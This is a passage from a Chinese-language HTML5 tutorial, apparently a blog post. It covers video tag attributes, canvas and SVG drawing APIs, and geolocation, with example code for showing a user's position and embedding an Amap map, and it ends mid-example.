<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt; <span class="attr">video</span>  <span class="attr">controls</span>=<span class="string">"controls"</span>  <span class="attr">width</span>=<span class="string">"300"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"move.ogg"</span> <span class="attr">type</span>=<span class="string">"video/ogg"</span> &gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"move.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span> &gt;</span></span><br><span class="line">	您的浏览器暂不支持video标签。播放视频</span><br><span class="line"><span class="tag">&lt;/ <span class="attr">video</span> &gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong><code>Video</code>的常见属性</strong></li>
</ul>
<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Autoplay</td>
<td>Autoplay</td>
<td>视频就绪自动播放</td>
</tr>
<tr>
<td>controls</td>
<td>controls</td>
<td>向用户显示播放控件</td>
</tr>
<tr>
<td>Width</td>
<td>Pixels(像素)</td>
<td>设置播放器宽度</td>
</tr>
<tr>
<td>Height</td>
<td>Pixels(像素)</td>
<td>设置播放器高度</td>
</tr>
<tr>
<td>Loop</td>
<td>Loop</td>
<td>播放完是否继续播放该视频，循环播放</td>
</tr>
<tr>
<td>Preload</td>
<td>load{auto,meta,none}</td>
<td>规定是否预加载视频。</td>
</tr>
<tr>
<td>Src</td>
<td>url</td>
<td>视频url地址</td>
</tr>
<tr>
<td>Poster</td>
<td>Imgurl</td>
<td>加载等待的画面图片</td>
</tr>
<tr>
<td>Autobuffer</td>
<td>Autobuffer</td>
<td>设置为浏览器缓冲方式，不设置autoply才有效</td>
</tr>
</tbody>
</table>
<ul>
<li><strong><code>Video</code>的<code>API</code>方法</strong></li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>属性</th>
<th>事件</th>
</tr>
</thead>
<tbody>
<tr>
<td>play()</td>
<td>currentSrc</td>
<td>play</td>
</tr>
<tr>
<td>pause()</td>
<td>currentTime</td>
<td>pause</td>
</tr>
<tr>
<td>load()</td>
<td>videoWidth</td>
<td>progress</td>
</tr>
<tr>
<td>canPlayType()</td>
<td>videoHeight</td>
<td>error</td>
</tr>
</tbody>
</table>
<h3 id="第十三课-canvas"><a class="markdownIt-Anchor" href="#第十三课-canvas"></a> 第十三课 canvas</h3>
<hr />
<ul>
<li>标签 <code>&lt;canvas&gt;</code>
<ul>
<li>不支持<code>canvas</code> 的浏览器可以看到的内容</li>
<li>默认宽度<code>300px</code>，默认高度<code>150px</code></li>
<li>注意：<code>canvas</code>宽高需要设置在标签中 否则绘制的东西可能出错</li>
</ul>
</li>
<li><code>&lt;canvas&gt;</code> 绘制环境
<ul>
<li><code>getContext(&quot;2d&quot;)</code>;目前支持<code>2d</code>的场景</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">width</span>=<span class="string">""</span> <span class="attr">height</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">	您的浏览器不支持canvas，请更换浏览器！</span><br><span class="line"><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><strong>绘制矩形</strong></p>
<ul>
<li><code>rect(L,T,W,H)</code>:创建一个矩形</li>
<li><code>fillRect(L,T,W,H)</code>:绘制填充的矩形</li>
<li><code>clearRect(x,y,w,h)</code> 清除矩形选区</li>
<li><code>strokeRect(L,T,W,H)</code>绘制空心矩形(无填充)
<ul>
<li>默认一像素黑色边框</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>设置绘图样式</strong></p>
<ul>
<li><code>fillStyle</code>:填充颜色(绘制<code>canvas</code>是有顺序的)</li>
<li><code>lineWidth</code>:触笔宽度(线宽)</li>
<li><code>strokeStyle</code>:触笔颜色</li>
</ul>
</li>
<li>
<p><strong>绘制路径</strong></p>
<ul>
<li><code>beginPath()</code> :开始路径</li>
<li><code>closePath():</code>结束路径</li>
<li><code>moveTo(x,y)</code>:将触笔移动到x,y点</li>
<li><code>lineTo(x,y)</code>:绘制到x,y点</li>
<li><code>stroke():</code> 触笔方法 画线  默认为黑色</li>
<li><code>fill()</code>:填充方法</li>
<li><code>rect(x,y,w,h)</code>:矩形路径</li>
<li><code>save()</code>:保存路径</li>
<li><code>restore()</code>:恢复路径</li>
</ul>
</li>
<li>
<p><strong>绘制曲线</strong></p>
<ul>
<li><code>arcTo(x1,y1,x2,y2,r)</code>
<ul>
<li><code>x1</code>,<code>y1</code> 坐标一  <code>x2</code>,<code>y2</code>坐标二   r圆弧半斤</li>
</ul>
</li>
<li><code>quadraticCurveTo(dx,dy,x1,y1)</code>
<ul>
<li>贝塞尔曲线:<code>dx</code>,<code>dy</code>控制点  <code>x1</code>,<code>y1</code>结束坐标</li>
</ul>
</li>
<li><code>bezierCurveTo(dx1,dy1,dx2,dy2,x1,y1)</code>
<ul>
<li>贝塞尔曲线:<code>dx1,dy1</code> 控制点一 <code>dx2,dy2</code>控制点二</li>
<li><code>x1,y1</code>结束坐标</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>绘制圆形</strong></p>
<ul>
<li><code>arc(x,y,半径,起始弧度,结束弧度,旋转方向)</code>
<ul>
<li><code>x</code>，<code>y</code>起始位置</li>
<li>弧度与角度：<code>弧度=角度值*Math.PI/180</code></li>
<li>旋转方向：顺时针（默认：<code>false</code>），逆时针（<code>true</code>）</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>绘制文本</strong></p>
<ul>
<li><code>strokeText(文本,x,y)</code>;  绘制空心文本</li>
<li><code>fillText(文本,x,y)</code>; 绘制实心文本</li>
<li><code>font = &quot;font-size font-family&quot;</code>注:尺寸 字体缺一不可
<ul>
<li><code>textAlign = &quot;&quot;;</code>文本左右对齐方式  <code>start center end left right</code></li>
<li><code>textBaseline</code>文本上下对齐方式
<ul>
<li><code>alphabetic</code>默认。文本基线是普通的字母基线。</li>
<li><code>top</code>	文本基线是 <code>em</code> 方框的顶端。。</li>
<li><code>hanging</code>	文本基线是悬挂基线。</li>
<li><code>middle</code>	文本基线是<code>em</code> 方框的正中。</li>
<li><code>ideographic</code>	文本基线是表意基线。</li>
<li><code>bottom</code>	文本基线是 <code>em</code> 方框的底端。</li>
<li><code>measureText(文本).width;</code> 文本实际宽度(只有宽度值)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>图形边界样式</strong></p>
<ul>
<li><code>lineJoin</code>: 边界连接点样式
<ul>
<li><code>miter</code>(默认值),<code>round</code>(圆角),<code>bevel</code>(斜角)</li>
</ul>
</li>
<li><code>lineCap</code>: 端点样式
<ul>
<li><code>butt</code>(默认值),<code>round</code>(圆角),<code>square</code>(高度多出线宽一半)</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>绘制图片</strong></p>
<ul>
<li>
<p>图片预加载，获取图片文件</p>
<ul>
<li><code>onload</code>中调用</li>
<li><code>drawImage(img,x,y,w,h);</code>绘制图片(图片,坐标<code>x</code>,坐标<code>y</code>,宽度,高度)</li>
</ul>
</li>
<li>
<p>设置背景</p>
<ul>
<li><code>createPattern(img,平铺方式)</code></li>
<li>平铺方式:<code>repeat</code>,<code>repeat-x</code>,<code>repeat-y</code>,<code>no-repeat</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>canvas变换</strong></p>
<ul>
<li><code>translate(x,y)</code></li>
<li>坐标基准点偏移 : 从起始点为基准，移动到当前位置</li>
<li><code>rotate(弧度)</code>: 旋转  <code>弧度公式 = 角度*PI/180</code></li>
<li><code>scale(wb,hb)</code>缩放比例(缩放<code>canvas</code>绘制的图片)</li>
</ul>
</li>
<li>
<p><strong>颜色渐变</strong></p>
<ul>
<li>线性渐变:<code>createLinearGradient(x1,y1,x2,y2)</code>
<ul>
<li><code>x1</code>,<code>y1</code>起始坐标点</li>
<li><code>x2</code>,<code>y2</code>结束坐标点</li>
</ul>
</li>
<li>径向渐变:<code>createRadialGradient(x1,y1,r1,x2,y2,r2)</code>
<ul>
<li><code>x1</code>,<code>y1</code>,<code>r1</code>内圆坐标及半径</li>
<li><code>x2</code>,<code>y2</code>,<code>r2</code>外圆坐标及半径</li>
<li><code>addColorStop</code>(位置,颜色)  位置:渐变点  <code>0-1</code>之间 可多个</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>阴影</strong></p>
<ul>
<li><code>shadowOffsetX</code>,<code>shadowOffsetY</code>    <code>x</code>轴、<code>y</code>轴偏移</li>
<li><code>shadowBlur</code>    阴影模糊度</li>
<li><code>shadowColor</code>  阴影颜色 默认颜色:<code>rgba(0,0,0,0)</code></li>
</ul>
</li>
<li>
<p><strong>像素</strong></p>
<ul>
<li><code>createImageData(sx,sy)</code> 创建新的、空白的 <code>ImageData</code> 对象</li>
<li><code>getImageData(x1,y1,sx,sy)</code>
<ul>
<li>返回<code>ImageData</code>对象，该对象为画布上指定的矩形复制像素数据<code>putImageData(img,x2,y2)</code></li>
<li>把图像数据（从指定的 <code>ImageData</code> 对象）放回画布上</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>合成</strong></p>
<ul>
<li><code>globalAlpha</code>  设置或返回绘图的当前<code>alpha</code>或透明值</li>
<li><code>globalCompositeOperation</code> 设置或返回新图像如何绘制到已有的图像上</li>
<li><code>source-over</code>默认。在目标图像上显示源图像。</li>
<li><code>source-atop</code>在目标图像顶部显示源图像。源图像位于目标图像之外的部分是不可见的。</li>
<li><code>source-in</code>	在目标图像中显示源图像。只有目标图像内的源图像部分会显示，目标图像是透明的。</li>
<li><code>source-out</code>在目标图像之外显示源图像。只会显示目标图像之外源图像部分，目标图像是透明的。</li>
<li><code>destination-over</code>在源图像上方显示目标图像。</li>
<li><code>destination-atop</code>在源图像顶部显示目标图像。源图像之外的目标图像部分不会被显示。</li>
<li><code>destination-in</code>在源图像中显示目标图像。只有源图像内的目标图像部分会被显示，源图像是透明的。</li>
<li><code>destination-out</code>在源图像外显示目标图像。只有源图像外的目标图像部分会被显示，源图像是透明的。</li>
<li><code>lighter</code>显示源图像 + 目标图像。</li>
<li><code>copy</code>显示源图像。忽略目标图像。</li>
<li><code>xor</code>使用异或操作对源图像与目标图像进行组合。</li>
</ul>
</li>
<li>
<p>扩展阅读</p>
<ul>
<li><a href="http://luckykun.com/work/2016-09-01/canvas-study01.html" target="_blank" rel="noopener">canvas学习之API整理笔记（一）</a></li>
<li><a href="http://jartto.wang/2016/07/25/make-an-inventory-of-html5-api/" target="_blank" rel="noopener">HTML5 API大盘点</a></li>
</ul>
</li>
</ul>
<h3 id="第十四课-svg绘图"><a class="markdownIt-Anchor" href="#第十四课-svg绘图"></a> 第十四课 SVG绘图</h3>
<hr />
<ul>
<li>
<p><strong>svg是什么</strong></p>
<ul>
<li>矢量图</li>
<li>与<code>canvas</code>的区别</li>
</ul>
</li>
<li>
<p><strong>svg的引入方式</strong></p>
<ul>
<li>方式一：</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> </span></span><br><span class="line"><span class="meta">PUBLIC <span class="meta-string">"-//W3C//DTD SVG 1.1//EN"</span>  <span class="meta-string">"http://www.w3.org/</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">Graphics/SVG/1.1/DTD/svg11.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>方式二：</p>
<ul>
<li>图片、背景、框架</li>
</ul>
</li>
<li>
<p>方式三:</p>
<ul>
<li><code>html</code>页面中添加<code>svg</code></li>
</ul>
</li>
<li>
<p><strong><code>circle</code>:圆形</strong></p>
<ul>
<li>圆心坐标  <code>cx</code>,<code>cy</code></li>
<li>半径  <code>r</code></li>
<li><code>fill</code>   <code>stroke</code>  <code>stroke-width</code>     <code>stlye</code>样式</li>
<li><code>fill = &quot;none/transparent&quot;</code></li>
</ul>
</li>
<li>
<p><strong>ellipse:椭圆</strong></p>
<ul>
<li><code>cx</code>属性定义的椭圆中心的x坐标</li>
<li><code>cy</code>属性定义的椭圆中心的y坐标</li>
<li><code>rx</code>属性定义的水平半径</li>
<li><code>ry</code>属性定义的垂直半径</li>
</ul>
</li>
<li>
<p><strong>rect : 矩形</strong></p>
<ul>
<li><code>width</code>  <code>height</code> 宽高</li>
<li>坐标 <code>x</code>,<code>y</code></li>
<li>圆角  <code>rx</code>,<code>ry</code></li>
</ul>
</li>
<li>
<p><strong><code>line</code>:线条</strong></p>
<ul>
<li><code>x1</code>,<code>y1</code>,<code>x2</code>,<code>y2</code></li>
<li><code>stroke-opacity</code>  透明  <code>fill-opacity</code></li>
</ul>
</li>
<li>
<p><strong>polyline:折线</strong></p>
<ul>
<li><code>points</code>:点坐标（<code>x1 y1 x2 y2...</code>）或(<code>x1,y1,x2,y2....</code>)</li>
</ul>
</li>
<li>
<p><strong>polygon:多边形</strong></p>
<ul>
<li>折线闭合  <code>fill-rule:evenodd/nonzero</code>;</li>
</ul>
</li>
<li>
<p><strong>path: 路劲</strong></p>
<ul>
<li><code>d</code>属性</li>
<li><code>M(起始坐标)</code>,<code>L(结束坐标)</code>,<code>H(水平线)</code>,<code>V(垂直线)</code>,<code>A(圆弧)</code>,<code>Z(闭合路劲)</code>
<ul>
<li><code>C</code>,<code>S</code>,<code>Q</code>,<code>T</code> 贝塞尔曲线</li>
<li>大写为绝对坐标(具体的坐标位置)</li>
<li>小写为相对坐标(相对起始坐标点的具体长度)</li>
</ul>
</li>
<li>A命令
<ul>
<li><code>x</code>半径 <code>y</code>半径 角度  弧长(0 小弧 1大弧)  方向(0逆时针 1顺时针)</li>
<li>终点<code>(x y)</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>C命令：三次贝塞尔曲线</strong></p>
<ul>
<li><code>(x1,y1,x2,y2,x,y)</code>    <code>x1</code>,<code>y1</code>控制点一    <code>x2</code>,<code>y2</code>控制点二   <code>x</code>,<code>y</code>结束点</li>
</ul>
</li>
<li>
<p><strong>S命令：平滑贝塞尔曲线(自动对称一个控制点)</strong></p>
<ul>
<li><code>(x2,y2,x,y)</code>  <code>x2</code>,<code>y2</code>控制点    x,y结束点</li>
</ul>
</li>
<li>
<p><strong>Q命令：二次贝塞尔曲线</strong></p>
<ul>
<li><code>(x1,y1,x,y)</code>   x1,y1控制点  x,y结束点</li>
</ul>
</li>
<li>
<p><strong>T命令：一次贝塞尔曲线</strong></p>
<ul>
<li><code>(x,y)</code>结束点</li>
</ul>
</li>
<li>
<p><strong><code>g</code>标签:组合元素  设置元素公共属性</strong></p>
<ul>
<li>共用属性</li>
<li><code>transform = &quot;translate(0,0)&quot;</code></li>
</ul>
</li>
<li>
<p><strong><code>text</code>标签</strong></p>
<ul>
<li><code>x</code>, <code>y</code>, <code>text-anchor</code>(对齐start end middle)	<code>font-size</code></li>
</ul>
</li>
<li>
<p><strong><code>image</code> 标签</strong></p>
<ul>
<li><code>x</code>, <code>y</code>, <code>width</code>  <code>height</code></li>
<li><code>xlink:href</code>(图片地址)</li>
</ul>
</li>
</ul>
<h3 id="第十五课-地理信息与本地存储"><a class="markdownIt-Anchor" href="#第十五课-地理信息与本地存储"></a> 第十五课 地理信息与本地存储</h3>
<hr />
<h4 id="地理位置"><a class="markdownIt-Anchor" href="#地理位置"></a> 地理位置</h4>
<hr />
<ul>
<li>
<p>经度  :   南北极的连接线</p>
</li>
<li>
<p>纬度  :   东西连接的线</p>
</li>
<li>
<p>位置信息从何而来</p>
<ul>
<li><code>IP</code>地址</li>
<li><code>GPS</code>全球定位系统</li>
<li><code>Wi-Fi</code>无线网络</li>
<li>基站</li>
</ul>
</li>
<li>
<p><code>avigator.geolocation</code></p>
<ul>
<li>
<p>单次定位请求  ：<code>getCurrentPosition</code>(请求成功,请求失败,数据收集方式)</p>
</li>
<li>
<p><strong>请求成功函数</strong></p>
<ul>
<li>经度 :  <code>coords.longitude</code></li>
<li>纬度 :  <code>coords.latitude</code></li>
<li>准确度 :  <code>coords.accuracy</code></li>
<li>海拔 : <code>coords.altitude</code></li>
<li>海拔准确度 :  <code>coords.altitudeAcuracy</code></li>
<li>行进方向 :  <code>coords.heading</code></li>
<li>地面速度 :  <code>coords.speed</code></li>
<li>请求的时间: <code>new Date(position.timestamp)</code></li>
</ul>
</li>
<li>
<p><strong>请求失败函数</strong></p>
<ul>
<li>失败编号  ：<code>code</code>
<ul>
<li>0  :  不包括其他错误编号中的错误</li>
<li>1  :  用户拒绝浏览器获取位置信息</li>
<li>2  :  尝试获取用户信息，但失败了</li>
<li>3  :   设置了<code>timeout</code>值，获取位置超时了</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>数据收集 :  json的形式</strong></p>
<ul>
<li><code>enableHighAcuracy</code>  :  更精确的查找，默认<code>false</code></li>
<li><code>timeout</code> :  获取位置允许最长时间，默认<code>infinity</code></li>
<li><code>maximumAge</code> :  位置可以缓存的最大时间，默认<code>0</code></li>
</ul>
</li>
<li>
<p><strong>多次定位请求</strong>*  : <code>watchPosition</code></p>
<ul>
<li>移动设备有用，位置改变才会触发</li>
<li>配置参数：<code>frequency</code> 更新的频率</li>
<li>关闭更新请求  :  <code>clearWatch</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>examp01 getCurrentPosition</strong></p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span>请求位置信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"btn"</span>);</span><br><span class="line"><span class="keyword">var</span> box = <span class="built_in">document</span>.getElementById(<span class="string">"box"</span>);</span><br><span class="line">		</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			navigator.geolocation.getCurrentPosition(<span class="function"><span class="keyword">function</span>(<span class="params">position</span>)</span>&#123;</span><br><span class="line">				box.innerHTML +=<span class="string">"经度："</span>+position.coords.longitude + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"纬度："</span>+position.coords.latitude + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"海拔："</span>+position.coords.accuracy + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"海拔的准确度："</span>+position.coords.altitudeAccuracy + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"地面速度"</span>+position.coords.speed + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"行进方向"</span>+position.coords.heading + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"请求时间"</span>+<span class="keyword">new</span> <span class="built_in">Date</span>(position.timestamp) + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">				alert(err.code);</span><br><span class="line">			&#125;,&#123;</span><br><span class="line">				enableHighAccuracy:<span class="literal">false</span>,<span class="comment">//精确请求</span></span><br><span class="line">				timeout:<span class="number">5000</span>,<span class="comment">//设置超时</span></span><br><span class="line">				maximumAge:<span class="number">1000</span><span class="comment">//缓存时间</span></span><br><span class="line">			&#125;);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://codepen.io/poetries/pen/RKPWMg" target="_blank" rel="noopener">在线演示</a></p>
<ul>
<li><strong>examp02</strong></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"btn"</span>);</span><br><span class="line"><span class="keyword">var</span> box = <span class="built_in">document</span>.getElementById(<span class="string">"box"</span>);</span><br><span class="line">		</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			navigator.geolocation.watchPosition(<span class="function"><span class="keyword">function</span>(<span class="params">position</span>)</span>&#123;</span><br><span class="line">				box.innerHTML +=<span class="string">"经度："</span>+position.coords.longitude + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"纬度："</span>+position.coords.latitude + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"海拔："</span>+position.coords.accuracy + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"海拔的准确度："</span>+position.coords.altitudeAccuracy + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"地面速度"</span>+position.coords.speed + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"行进方向"</span>+position.coords.heading + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				box.innerHTML +=<span class="string">"请求时间"</span>+<span class="keyword">new</span> <span class="built_in">Date</span>(position.timestamp) + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">				alert(err.code);</span><br><span class="line">			&#125;,&#123;</span><br><span class="line">				enableHighAccuracy:<span class="literal">false</span>,<span class="comment">//精确请求</span></span><br><span class="line">				timeout:<span class="number">5000</span>,<span class="comment">//设置超时</span></span><br><span class="line">				maximumAge:<span class="number">1000</span><span class="comment">//缓存时间</span></span><br><span class="line">			&#125;);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://codepen.io/poetries/pen/zNGvjY" target="_blank" rel="noopener">在线演示</a></p>
<ul>
<li><strong>example03 高德地图应用</strong></li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#container</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">600px</span>; </span><br><span class="line">    <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">40px</span> auto;</span><br><span class="line">    <span class="attribute">border</span>:<span class="number">1px</span> solid red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">"http://webapi.amap.com/maps?v=1.3&amp;key=278b7b8b4728ba302b7e566fc2a97b36"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> AMap.Map(<span class="string">'container'</span>);</span><br></pre></td></tr></table></figure>
<p><a href="http://codepen.io/poetries/pen/qRdOKZ" target="_blank" rel="noopener">在线演示</a></p>
<ul>
<li><strong>examp04  搜索城市</strong></li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#container</span> &#123;<span class="attribute">width</span>:<span class="number">500px</span>; <span class="attribute">height</span>:<span class="number">500px</span>; <span class="attribute">margin</span>:<span class="number">100px</span> auto;&#125;  </span><br><span class="line"><span class="selector-class">.menu</span>&#123;</span><br><span class="line">	<span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">	<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="number">#000</span>;</span><br><span class="line">	<span class="attribute">margin</span>:auto;</span><br><span class="line">	<span class="attribute">background</span>:<span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span><br><span class="line">	<span class="attribute">list-style</span>:none;</span><br><span class="line">	<span class="attribute">line-height</span>:<span class="number">30px</span>;</span><br><span class="line">	<span class="attribute">text-align</span>:center;</span><br><span class="line">	<span class="attribute">cursor</span>:pointer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#box</span>&#123;</span><br><span class="line">	<span class="attribute">width</span>:<span class="number">400px</span>;</span><br><span class="line">	<span class="attribute">height</span>:<span class="number">40px</span>;</span><br><span class="line">	<span class="attribute">position</span>:absolute;</span><br><span class="line">	<span class="attribute">top</span>:<span class="number">150px</span>;</span><br><span class="line">	<span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">	<span class="attribute">margin-left</span>:-<span class="number">200px</span>;</span><br><span class="line">	<span class="attribute">background</span>:<span class="number">#fff</span>;</span><br><span class="line">	<span class="attribute">box-shadow</span>:<span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>&#123;</span><br><span class="line">	<span class="attribute">height</span>:<span class="number">38px</span>;</span><br><span class="line">	<span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line">	<span class="attribute">border</span>:none;</span><br><span class="line">	<span class="attribute">outline</span>:none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#btn</span>&#123;</span><br><span class="line">	<span class="attribute">width</span>:<span class="number">80px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"city"</span> <span class="attr">placeholder</span>=<span class="string">"请输入城市..."</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"搜索"</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">"http://webapi.amap.com/maps?v=1.3&amp;key=278b7b8b4728ba302b7e566fc2a97b36"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"btn"</span>);</span><br><span class="line"><span class="keyword">var</span> city = <span class="built_in">document</span>.getElementById(<span class="string">"city"</span>);</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> AMap.Map(<span class="string">'container'</span>);</span><br><span class="line"><span class="keyword">var</span> toolBar,mouseTool,contextMenu;</span><br><span class="line"><span class="comment">//在地图中添加操作toolBar插件、mouseTool插件</span></span><br><span class="line">map.plugin([<span class="string">"AMap.ToolBar"</span>,<span class="string">"AMap.MouseTool"</span>],<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	toolBar = <span class="keyword">new</span> AMap.ToolBar();</span><br><span class="line">	map.addControl(toolBar);</span><br><span class="line">	mouseTool = <span class="keyword">new</span> AMap.MouseTool(map);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> menuContext = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">menuContext.innerHTML = <span class="string">"&lt;div class=menu&gt;</span></span><br><span class="line"><span class="string">                            &lt;ul&gt;</span></span><br><span class="line"><span class="string">                              &lt;li onclick='zoomMenu(0)'&gt;缩小&lt;/li&gt;</span></span><br><span class="line"><span class="string">                              &lt;li onclick='zoomMenu(1)'&gt;放大&lt;/li&gt;</span></span><br><span class="line"><span class="string">                              &lt;li onclick='distanceMeasureMenu()'&gt;距离量测&lt;/li&gt;</span></span><br><span class="line"><span class="string">                              &lt;li onclick = 'addMarkerMenu()'&gt;添加标记&lt;/li&gt;</span></span><br><span class="line"><span class="string">                            &lt;/ul&gt;</span></span><br><span class="line"><span class="string">                          &lt;/div&gt;"</span>;</span><br><span class="line"><span class="comment">//创建一个自定义的右键菜单</span></span><br><span class="line">contextMenu = <span class="keyword">new</span> 